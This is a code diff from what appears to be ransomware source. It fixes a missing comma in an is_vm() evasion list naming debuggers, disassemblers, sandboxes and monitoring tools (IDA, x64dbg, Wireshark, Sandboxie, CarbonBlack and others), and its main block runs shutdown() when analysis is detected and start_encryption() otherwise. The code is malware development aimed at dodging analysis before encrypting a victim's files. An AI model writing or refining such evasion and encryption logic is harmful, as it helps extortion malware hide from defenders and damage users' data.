@@ -629,7 +629,7 @@ def is_vm():
     ඞ_procs = [ # sus processes ඞ
         "Dbgview", "ILSpy", "ProcessHacker", "SbieCtrl", "SbieSvc", "SecurityHealthSystray", "WMIADAP", "autoruns", "autorunsc",
         "BurpSuite", "Cain", "CarbonBlack", "cb", "cmd", "Decoder", "dnSpy", "eventvwr", "Fiddler", "frida-server", "gdb", "gmer",
-        "HookExplorer", "HttpAnalyzerV7", "HttpDebuggerUI", "ida", "ida64", "idag", "idag64", "idaq", "idaq64", "idaw", "x64dbg"
+        "HookExplorer", "HttpAnalyzerV7", "HttpDebuggerUI", "ida", "ida64", "idag", "idag64", "idaq", "idaq64", "idaw", "x64dbg",
         "idaw64", "ImmunityDebugger", "ksdumper", "msconfig", "netmon", "netstat", "ollydbg", "perfmon", "powershell", "ProcessHacker",
         "procexp", "procexp64", "procmon", "regedit", "regmon", "regripper", "Sandboxie", "schtasks", "services", "smartscreen",
         "sxutil", "sysmon", "tasklist", "taskmgr", "tcpview", "VBoxService", "Wireshark", "Windasm", "windbg", "wmic", "x32dbg",
@@ -815,3 +815,4 @@ if __name__ == "__main__":
         shutdown()
     else:
         start_encryption()
+
